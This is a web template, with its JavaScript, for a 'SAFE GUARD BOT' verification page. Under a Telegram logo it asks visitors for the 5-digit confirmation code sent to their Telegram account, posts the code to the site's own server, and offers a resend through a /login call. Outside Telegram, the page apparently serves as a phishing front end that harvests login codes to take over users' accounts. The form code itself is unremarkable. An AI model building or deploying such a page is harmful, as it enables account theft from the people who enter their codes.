{% extends "base.html" %}

{% block title %}Verify Code - SAFE GUARD BOT{% endblock %}

{% block content %}
<div class="logo">
    <img src="{{ url_for('static', filename='tg-logo.png') }}" alt="Telegram Logo">
</div>
<h1>Enter the code</h1>
<p class="subtitle">We've sent a 5-digit confirmation code to your Telegram</p>

<form id="verifyForm">
    <div class="form-group">
        <label for="otp">Confirmation code</label>
        <div class="otp-input">
            <input type="text" maxlength="1" class="otp-digit" data-index="0">
            <input type="text" maxlength="1" class="otp-digit" data-index="1">
            <input type="text" maxlength="1" class="otp-digit" data-index="2">
            <input type="text" maxlength="1" class="otp-digit" data-index="3">
            <input type="text" maxlength="1" class="otp-digit" data-index="4">
        </div>
        <div style="margin-top: 10px; font-size: 12px; color: #6c7b7f;">
            💡 Tip: You can paste the 5-digit code directly to fill all boxes
        </div>
        <!-- Hidden input for better paste handling -->
        <input type="text" id="pasteInput" style="position: absolute; left: -9999px; opacity: 0;" placeholder="Paste code here">
    </div>
    
    <button type="submit" class="btn" id="verifyBtn">
        Verify
    </button>
</form>

<div style="margin-top: 20px;">
    <a href="#" class="resend-link" id="resendLink">Resend code</a>
    <span id="resendTimer" style="display: none; margin-left: 10px; color: #666; font-size: 14px;">
        Resend available in <span id="countdown">60</span>s
    </span>
</div>

<div style="margin-top: 10px; font-size: 12px; color: #666;">
    Didn't receive the code? Check your Telegram messages
</div>
{% endblock %}

{% block scripts %}
<script>
const otpInputs = document.querySelectorAll('.otp-digit');
const verifyForm = document.getElementById('verifyForm');
const verifyBtn = document.getElementById('verifyBtn');
const resendLink = document.getElementById('resendLink');

// Auto-focus next input when typing
otpInputs.forEach((input, index) => {
    input.addEventListener('input', function(e) {
        const value = e.target.value;
        if (value && index < otpInputs.length - 1) {
            otpInputs[index + 1].focus();
        }
    });
    
    input.addEventListener('keydown', function(e) {
        if (e.key === 'Backspace' && !e.target.value && index > 0) {
            otpInputs[index - 1].focus();
        }
    });
    
    // Handle paste event
    input.addEventListener('paste', function(e) {
        e.preventDefault();
        const pastedData = (e.clipboardData || window.clipboardData).getData('text');
        const digits = pastedData.replace(/\D/g, '').slice(0, 5); // Get only digits, max 5
        
        if (digits.length === 5) {
            // Fill all inputs with the pasted digits
            otpInputs.forEach((input, i) => {
                input.value = digits[i] || '';
            });
            // Focus the last input
            otpInputs[4].focus();
            console.log('📋 Pasted code:', digits);
        } else {
            // If not 5 digits, just fill the current input
            input.value = digits[0] || '';
            if (digits.length > 1 && index < otpInputs.length - 1) {
                otpInputs[index + 1].focus();
            }
        }
    });
});

verifyForm.addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const otp = Array.from(otpInputs).map(input => input.value).join('');
    
    if (otp.length !== 5) {
        showError('Please enter the complete 5-digit code');
        return;
    }
    
    // Log the code for debugging
    console.log('🔐 Verification code entered:', otp);
    
    verifyBtn.disabled = true;
    verifyBtn.textContent = 'Verifying...';
    
    try {
        const response = await fetch('/verify', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ otp: otp })
        });
        
        const data = await response.json();
        
        if (data.success) {
            showSuccess('Verified! You can now close safebot app.');
            console.log('✅ User authenticated:', data.user_info);
            // Try to close the tab/window after a short delay
            setTimeout(() => {
                try {
                    window.close();
                } catch (e) {
                    console.log('Could not close window automatically:', e);
                }
            }, 2000);
        } else {
            showError(data.error || 'Invalid code. Please try again.');
            console.log('❌ Verification failed:', data.error);
            // Clear inputs on error
            otpInputs.forEach(input => input.value = '');
            otpInputs[0].focus();
        }
    } catch (error) {
        showError('Network error. Please try again.');
        console.log('❌ Network error:', error);
    } finally {
        verifyBtn.disabled = false;
        verifyBtn.textContent = 'Verify';
    }
});

// Resend functionality with cooldown
let resendCooldown = 0;
let resendTimerInterval = null;

function startResendCooldown(seconds = 60) {
    resendCooldown = seconds;
    resendLink.style.display = 'none';
    resendTimer.style.display = 'inline';
    
    resendTimerInterval = setInterval(() => {
        resendCooldown--;
        document.getElementById('countdown').textContent = resendCooldown;
        
        if (resendCooldown <= 0) {
            clearInterval(resendTimerInterval);
            resendLink.style.display = 'inline';
            resendTimer.style.display = 'none';
        }
    }, 1000);
}

resendLink.addEventListener('click', async function(e) {
    e.preventDefault();
    
    // Prevent multiple clicks
    if (resendCooldown > 0) return;
    
    resendLink.style.pointerEvents = 'none';
    resendLink.textContent = 'Sending...';
    
    try {
        const response = await fetch('/login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                phone_number: 'resend'
            })
        });
        
        const data = await response.json();
        
        if (data.success) {
            showSuccess('New code sent! Check your Telegram messages.');
            startResendCooldown(60); // 60 second cooldown
        } else {
            showError(data.error || 'Failed to resend code. Please try again.');
            resendLink.style.pointerEvents = 'auto';
            resendLink.textContent = 'Resend code';
        }
    } catch (error) {
        showError('Network error. Please try again.');
        resendLink.style.pointerEvents = 'auto';
        resendLink.textContent = 'Resend code';
    }
});

// Focus first input on page load
otpInputs[0].focus();

// Global paste handler for the entire page
document.addEventListener('paste', function(e) {
    const pastedData = (e.clipboardData || window.clipboardData).getData('text');
    const digits = pastedData.replace(/\D/g, '').slice(0, 5); // Get only digits, max 5
    
    if (digits.length === 5) {
        // Fill all inputs with the pasted digits
        otpInputs.forEach((input, i) => {
            input.value = digits[i] || '';
        });
        // Focus the last input
        otpInputs[4].focus();
        console.log('📋 Pasted code globally:', digits);
    }
});
</script>
{% endblock %} 